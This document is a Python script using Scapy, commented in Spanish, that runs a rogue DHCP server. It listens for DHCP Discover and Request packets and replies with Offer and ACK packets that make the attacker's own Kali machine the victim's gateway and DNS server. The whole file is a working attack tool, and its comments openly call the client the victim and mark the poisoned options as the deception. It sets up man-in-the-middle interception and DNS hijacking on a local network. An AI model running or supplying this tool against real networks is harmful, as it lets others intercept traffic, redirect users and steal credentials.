#!/usr/bin/env python3
# D31B1 DHCP Rogue Server V2 (Con soporte para REQUEST/ACK)
# Uso: sudo python3 d31b1_dhcp_rogue_v2.py

from scapy.all import *

# --- TUS DATOS ---
MY_IP = "20.24.20.2"       # Tu Kali
FAKE_GATEWAY = "20.24.20.2"  # Tú (Gateway)
FAKE_DNS = "20.24.20.2"      # Tú (DNS)
SUBNET_MASK = "255.255.255.0"
TARGET_IFACE = "eth0"
OFFERED_IP = "20.24.20.100"  # La IP que le daremos a la víctima

def listen_dhcp():
    print(f"\n[*] SERVIDOR DHCP ROGUE V2 ACTIVO EN {TARGET_IFACE}")
    print(f"[*] Configuración venenosa -> GW: {FAKE_GATEWAY} | DNS: {FAKE_DNS}")
    print("[*] Esperando peticiones (Discover/Request)...")
    
    # Escuchamos tráfico UDP (Server port 67)
    sniff(filter="udp and port 67", prn=handle_dhcp_packet, iface=TARGET_IFACE)

def handle_dhcp_packet(packet):
    if DHCP in packet:
        # Obtenemos el tipo de mensaje DHCP
        # (1=Discover, 3=Request)
        dhcp_options = packet[DHCP].options
        message_type = None
        
        for opt in dhcp_options:
            if opt[0] == 'message-type':
                message_type = opt[1]
                break
        
        # CASO 1: VÍCTIMA BUSCA IP (DISCOVER) -> ENVIAMOS OFERTA (OFFER)
        if message_type == 1:
            print(f"[+] DISCOVER recibido de: {packet[Ether].src}")
            send_response(packet, "offer")

        # CASO 2: VÍCTIMA PIDE LA IP (REQUEST) -> CONFIRMAMOS (ACK)
        elif message_type == 3:
            print(f"[+] REQUEST recibido de: {packet[Ether].src} (Quiere la IP)")
            send_response(packet, "ack")

def send_response(packet, response_type):
    # Construir capas Ethernet/IP/UDP
    # Respondemos directamente a la MAC de la víctima (Unicast) o Broadcast si no tiene IP aún
    eth = Ether(src=get_if_hwaddr(TARGET_IFACE), dst=packet[Ether].src)
    ip = IP(src=MY_IP, dst="255.255.255.255")
    udp = UDP(sport=67, dport=68)
    
    # Opciones básicas
    options = [
        ("message-type", response_type),
        ("subnet_mask", SUBNET_MASK),
        ("router", FAKE_GATEWAY),    # <--- AQUÍ ESTÁ EL ENGAÑO
        ("name_server", FAKE_DNS),   # <--- AQUÍ ESTÁ EL ENGAÑO
        ("lease_time", 86400),
        ("server_id", MY_IP),
        "end"
    ]
    
    # Construir BOOTP
    bootp = BOOTP(op=2, yiaddr=OFFERED_IP, siaddr=MY_IP, giaddr=0, 
                  xid=packet[BOOTP].xid, chaddr=packet[BOOTP].chaddr)
    
    dhcp_pkt = DHCP(options=options)
    packet_to_send = eth / ip / udp / bootp / dhcp_pkt
    
    print(f"[->] Enviando {response_type.upper()} a {OFFERED_IP}...")
    sendp(packet_to_send, iface=TARGET_IFACE, verbose=0)

if __name__ == "__main__":
    listen_dhcp()